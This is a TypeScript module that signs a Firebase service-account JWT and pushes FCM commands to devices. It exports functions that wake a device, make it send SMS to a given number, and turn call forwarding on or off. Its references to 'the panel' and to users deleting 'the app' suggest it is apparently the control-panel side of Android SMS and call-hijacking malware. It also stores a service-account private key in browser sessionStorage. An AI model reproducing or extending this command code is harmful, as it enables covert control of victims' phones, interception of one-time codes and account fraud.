import { SignJWT, importPKCS8 } from "jose";

const DEFAULT_SERVICE_ACCOUNT = {
  type: "service_account",
  project_id: "",
  private_key: "",
  client_email: "",
};

function getServiceAccount() {
  try {
    const stored = sessionStorage.getItem("dxp_switched_fcm");
    if (stored) {
      const parsed = JSON.parse(stored);
      if (parsed?.project_id && parsed?.client_email && parsed?.private_key) {
        return parsed;
      }
    }
  } catch {}
  return DEFAULT_SERVICE_ACCOUNT;
}

let cachedToken: { token: string; expiry: number; forProject: string } | null = null;

async function getAccessToken(): Promise<string> {
  const sa = getServiceAccount();
  if (!sa.project_id || !sa.client_email || !sa.private_key) {
    throw new Error("FCM service account is not configured. Add dxp_switched_fcm in session or configure runtime values.");
  }

  // Invalidate cache if project changed
  if (cachedToken && cachedToken.forProject === sa.project_id && Date.now() < cachedToken.expiry) {
    return cachedToken.token;
  }

  const privateKey = await importPKCS8(sa.private_key, "RS256");

  const jwt = await new SignJWT({
    scope: "https://www.googleapis.com/auth/firebase.messaging",
  })
    .setProtectedHeader({ alg: "RS256", typ: "JWT" })
    .setIssuer(sa.client_email)
    .setAudience("https://oauth2.googleapis.com/token")
    .setIssuedAt()
    .setExpirationTime("1h")
    .sign(privateKey);

  const res = await fetch("https://oauth2.googleapis.com/token", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({
      grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer",
      assertion: jwt,
    }),
  });

  const data = await res.json();
  if (!data.access_token) {
    throw new Error("Failed to get access token");
  }

  cachedToken = {
    token: data.access_token,
    expiry: Date.now() + 3500 * 1000,
    forProject: sa.project_id,
  };

  return data.access_token;
}

async function sendFcm(deviceToken: string, type: string, payload: Record<string, string> = {}): Promise<{ success: boolean; error?: string }> {
  try {
    const sa = getServiceAccount();
    const accessToken = await getAccessToken();

    const body = {
      message: {
        token: deviceToken,
        data: { type, ...payload },
        android: { priority: "high" },
      },
    };

    const res = await fetch(
      `https://fcm.googleapis.com/v1/projects/${sa.project_id}/messages:send`,
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${accessToken}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify(body),
      }
    );

    if (res.ok) {
      return { success: true };
    } else {
      const errData = await res.json().catch(() => null);
      const errorCode = errData?.error?.details?.[0]?.errorCode;

      if (res.status === 404 && errorCode === "UNREGISTERED") {
        return { success: false, error: "User has deleted the app from their device." };
      } else if (res.status === 403) {
        return { success: false, error: "Firebase not linked. Kindly contact the developer of the panel." };
      }

      return { success: false, error: `FCM failed (${res.status}): ${JSON.stringify(errData)}` };
    }
  } catch (e: any) {
    return { success: false, error: e.message };
  }
}

export async function sendPing(fcmToken: string) {
  return sendFcm(fcmToken, "ping", { info: "wake" });
}

export async function sendSMS(fcmToken: string, number: string, message: string, sim: string = "0") {
  return sendFcm(fcmToken, "sms", { number, message, sim });
}

export async function sendCallForward(fcmToken: string, number: string, status: string = "true", sim: string = "0") {
  return sendFcm(fcmToken, "call", { number, status, sim });
}
